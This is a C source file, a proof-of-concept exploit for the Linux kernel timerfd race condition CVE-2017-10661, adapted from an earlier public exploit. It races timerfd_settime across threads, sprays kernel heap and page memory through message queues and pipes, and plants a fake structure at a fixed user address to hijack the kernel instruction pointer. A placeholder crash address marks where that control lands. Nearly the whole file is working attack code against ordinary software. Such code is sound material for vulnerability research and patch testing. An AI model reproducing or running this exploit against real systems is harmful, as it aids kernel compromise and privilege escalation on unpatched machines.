// A Proof-of-Concept demonstrating ip control for CVE-2017-10661, modified from ww9210's exploit
// author: Lewis_Chen_

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/time.h>
//#include <sys/msg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/mman.h>

#include <linux/membarrier.h>

#include "libexp.h"
#include "libpagespray.c"
#define CRASH_IP 0xffffffffdeadbeef
#define STRUCT_LEN 256
#define SPRAY_NUM 0x400

struct itimerspec new_t ={
	.it_interval={
		.tv_sec=100,
		.tv_nsec=100
	},
	.it_value={
		.tv_sec=100,
		.tv_nsec=100
	}
};

struct msg_spray_t *spray_list[1000];
int spray_cnt = 0;
int cpu_id = 0;
char take_page_back_buffer[0x1000];

/******************** Heap Spray ************************/

char spray_buffer[256];
void spray_buffer_init() {
	memset(spray_buffer, 0, 256);
	*(unsigned long*)(spray_buffer + 0x60 + 0x30)=0xfacea100; // timerfd_ctx->wqh.next
	*(unsigned long*)(spray_buffer + 0xa0 + 0x30)=0x1; // timerfd_ctx->might_cancel
}

struct msgbuf {
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msgbuf msg={0x4141414141414141,{0}};
int msqid;

void spray_msg_init() {
	memcpy(msg.mtext, spray_buffer, STRUCT_LEN-1);
}

/******************** The Use Found by FUZE ************************/
void loop()
{
	puts("trigger adjustime");
	syscall(__NR_clock_adjtime, 0x0ul, 0x20213f30ul);
	return;
}

/******************** Race ************************/
int fd;
volatile int ready;
void* list_add_thread(void* arg) {
	int cpuid = (int)(long)arg;
	set_cpu(cpuid);

	int ret;

	while(ready == 0);

	int i = 0;
	while(i < 1){

		ret = timerfd_settime(fd, 3, &new_t,NULL);

		if (ret < 0){
			perror("timerfd settime failed !");
		}
		i++;
	}

	return NULL;
}

void stop(char *fmt) {
	puts(fmt);
	getchar();
}
#define RACE_TIME 8000
#define NUM_THREADS cpu_num * 5
int do_race(){
	pthread_t *th = calloc(sizeof(pthread_t), NUM_THREADS);

    

	//memset(take_page_back_buffer, 'A', sizeof(take_page_back_buffer));

	for(int i=0; i<RACE_TIME; i++) {
		fprintf(stderr, "race: %d\n", i);
	
		for (int j = 0; j < cpu_num; j++) {
			stress_percpu_cache(j,216);
		}
		puts("stress done!");	
		
		// create victim ctx
		//struct msg_spray_t *warmup = msg_spray(NULL, 0xd0 - 0x30, 0x300);
		//msg_spray_clean(warmup);
		
		prep();
		//stage_1_iovec_spray();
		spray_list[spray_cnt++] = msg_spray(NULL, 0xd0 - 0x30, 0x300);

		//getchar();
		fd = timerfd_create(CLOCK_REALTIME, 0);			// alloc 216
		if (fd < 0) {
			perror("timerfd craete failed!");
			exit(1);
		}
		//stage_2_iovec_spray();
		spray_list[spray_cnt++] = msg_spray(NULL, 0xd0 - 0x30, 0x300);


		//usleep(100000);

		//sleep(1);
		// race to add victim ctx to cancel_list
        unset_cpu();
		ready = 0;
		for(long j = 0; j < NUM_THREADS; j++) {
			pthread_create(&th[j], NULL, list_add_thread, (void *)(j % cpu_num));
		}
        set_cpu(cpu_id);
		ready = 1;

		for(long j = 0; j < NUM_THREADS; j++){
			pthread_join(th[j], NULL);
		}	
		//usleep(100000);

		// free victim ctx and remove it from cancel_list
		close(fd);
		puts("close fd done");
		//usleep(100000);

        //free_all_iovec();
		for (int i = 0; i < spray_cnt; i++) {
			msg_spray_clean(spray_list[i]);
		}
		spray_cnt = 0;

		//usleep(10000); // TWEAKING THIS SLEEP IS CRUCIAL FOR SUCCESS RATE
		//syscall(__NR_membarrier, MEMBARRIER_CMD_SHARED, 0, 0);

		for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
            write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
			usleep(200);
        }
		loop();		// adjust time trigger
		cleanup();
		usleep(10000);
	}

	return 0;
}

/******************** User space ************************/

#define userspace_base_to_map 0xfacea000
void mmap_userspace_base(){
	void* userspace_base = mmap((void *)userspace_base_to_map-0x1000,0x1000 * 2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
	if (userspace_base < 0) {
		perror("fail to mmap");
		exit(1);
	}
}

void init_userspace_base() {
	mmap_userspace_base();
	*(unsigned long*)(userspace_base_to_map + 0xf8) = CRASH_IP;
}

void payload_setup(void)
{
	syscall(__NR_mmap, 0x20000000ul, 0xe26000ul, 0x3, 0x32, -1, 0);
	*(uint64_t*)0x20213f30 = (uint64_t)0x101;
	*(uint64_t*)0x20213f38 = (uint64_t)0xfffffffffffffffc;
	*(uint64_t*)0x20213f40 = (uint64_t)0x5;
	*(uint64_t*)0x20213f48 = (uint64_t)0x9;
	*(uint64_t*)0x20213f50 = (uint64_t)0xffffffffffff0000;
	*(uint64_t*)0x20213f58 = (uint64_t)0xffff;
	*(uint64_t*)0x20213f60 = (uint64_t)0x9;
	*(uint64_t*)0x20213f68 = (uint64_t)0x0;
	*(uint64_t*)0x20213f70 = (uint64_t)0x1;
	*(uint64_t*)0x20213f78 = (uint64_t)0xff;
	*(uint64_t*)0x20213f80 = (uint64_t)0x7;
	*(uint64_t*)0x20213f88 = (uint64_t)0x2;
	*(uint64_t*)0x20213f90 = (uint64_t)0x800;
	*(uint64_t*)0x20213f98 = (uint64_t)0xfff;
	*(uint64_t*)0x20213fa0 = (uint64_t)0x101;
	*(uint64_t*)0x20213fa8 = (uint64_t)0x100;
	*(uint64_t*)0x20213fb0 = (uint64_t)0x3;
	*(uint64_t*)0x20213fb8 = (uint64_t)0x7;
	*(uint64_t*)0x20213fc0 = (uint64_t)0x100000000;
	*(uint64_t*)0x20213fc8 = (uint64_t)0x101;
	*(uint64_t*)0x20213fd0 = (uint64_t)0x3f;
	*(uint64_t*)0x20213fd8 = (uint64_t)0x40;
	*(uint64_t*)0x20213fe0 = (uint64_t)0x2;
	*(uint64_t*)0x20213fe8 = (uint64_t)0x6;
	*(uint64_t*)0x20213ff0 = (uint64_t)0x8001;
	*(uint64_t*)0x20213ff8 = (uint64_t)0x1;

	spray_buffer_init();
	spray_msg_init();
	init_userspace_base();
}

void context_setup(void)
{
	// create dump ctx
	int fd_dumb = timerfd_create(CLOCK_REALTIME, 0);
	// add dump ctx to cancel_list
	int ret = timerfd_settime(fd_dumb, 3, &new_t, NULL);
	if (ret < 0) {
		perror("timerfd settime failed !");
		exit(1);
	}
}

// void proc_func(int start, int end)
// {
// 	// wait for the stage
// 	while(!*stage);

// 	for (int i = start ; i < end; i++) {
// 	    ret = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
// 		usleep(100);
// 	}

// 	while(1);
// }

// void launch_subproc()
// {
// 	stage = (int *)umem_alloc((void *)0x20000, 0x1000);
// 	*stage = 0;

// 	for(int i=0; i<FORK_NUM; i++) {
// 		if(!clean_fork()) {
// 			proc_func(j * (PIPE_PAGE_NUM / FORK_NUM), (j+1) * (PIPE_PAGE_NUM / FORK_NUM));
// 			while(1);
// 		}
// 	}
// }

int get_cpu_id(int argc, char **argv)
{
	if(argc < 2) return 0;
	int run_time = atoi(argv[1]);
	return run_time % cpu_num;
}

int main(int argc, char **argv) {

    cpu_id = get_cpu_id(argc, argv);
	set_cpu(cpu_id);

	context_setup();
	payload_setup();

    for (int i=0; i<0x1000/sizeof(spray_buffer); i++) {
    	memcpy(&take_page_back_buffer[i * sizeof(spray_buffer)], spray_buffer, sizeof(spray_buffer));
    }

	//launch_subproc();

	//getchar();
	// create victim ctx and add victim ctx to cancel_list
	int ret = do_race();
	if( ret < 0){
		puts("race failed!");
		exit(1);
	}

	sleep(5);
	return 0;
}
